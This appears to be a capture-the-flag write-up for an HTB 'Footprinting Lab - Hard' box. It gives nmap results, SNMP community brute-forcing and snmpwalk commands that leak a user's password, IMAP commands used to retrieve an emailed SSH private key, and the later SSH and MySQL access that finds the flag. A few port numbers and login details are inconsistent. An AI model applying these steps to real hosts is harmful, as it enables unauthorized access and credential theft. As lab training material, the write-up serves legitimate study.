
# Footprinting Lab - Hard

## Writeup

* Ran a NMAP scan on the box and found the following ports open:
  * 22 - ssh
    * SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0
    * Authentication methods supported are publickey and passwords.
  * 143 and 993 - Dovecot imapd
  * 118 amd 995 - Dovecot pop3
  * 62 - DHCP
  * 161 - net-snmp SNMPv3 server
    * `onesixtyone -c ~/HTB/Tools/SecLists/Discovery/SNMP/snmp-onesixtyone.txt 10.129.71.172`
    * `10.129.71.172 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64`
    * `snmpwalk -v2c -c backup 10.129.71.172 > snmpwalk_output`
    * Captured username and password `tom NMds732Js2761"` from SNMP walk
* User/Pass did not work directly in SSH as it requires a SSH key.
* Used user/pass to login to IMAP server and pull emails
    * `1 LOGIN username password 	User's login.`
    * `1 LIST "" *`
    * `1 SELECT INBOX`
    * `1 FETCH 1 all`
    * `1 FETCH 1 BODY[]`
    * The last query is how you see the actual body of the email.
    * The body of the email contains a ssh private key
    * I copied that file into a id_rsa file and modified it's permissions to read only for the user and no other permissions.
    * I then ssh'ed into the server using tom and the ssh key.
    * Once in the system I snooped around in the bash_history file which showed there is a mysql server running.
    * I logged into sql server using tom and his known password.
    * I then looked at the databases on the server and the tables in those DB's.
    * I found a user DB with a user table which contained the user HTB and it's password.
    * Challenge solved.
    * 
* Used captured username and password to gain access 
   * `ssh -v tom@inlanefreight.htb -o PreferredAuthentications=password`

  
* Host Iis Unbuntu and name is NIXHARD


## NMAP Scan Results

### TCP Scan Results
```
PORT    STATE SERVICE
22/tcp  open  ssh
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s
```

### SYN Scan Results
```
PORT    STATE SERVICE
22/tcp  open  ssh
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s
```

### Version Scan Results
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_pop3-capabilities: PIPELINING AUTH-RESP-CODE TOP UIDL CAPA SASL(PLAIN) RESP-CODES STLS USER
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: capabilities ENABLE Pre-login ID LITERAL+ more IDLE SASL-IR post-login listed IMAP4rev1 OK STARTTLS AUTH=PLAINA0001 have LOGIN-REFERRALS
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: capabilities ENABLE Pre-login ID LITERAL+ AUTH=PLAINA0001 more IDLE post-login IMAP4rev1 listed SASL-IR OK have LOGIN-REFERRALS
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER UIDL CAPA AUTH-RESP-CODE PIPELINING TOP RESP-CODES
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Vuln Scan Results
```
PORT    STATE SERVICE
22/tcp  open  ssh
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s
```

### Auth Scan Results
```
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-publickey-acceptance: 
|_  Accepted Public Keys: No public keys accepted
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s
```
### UDP Scan Results
```
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp
```

### UDP SNMP Version Scan Results
```
PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 5b99e75a10288b6100000000
|   snmpEngineBoots: 11
|_  snmpEngineTime: 1h45m28s
```
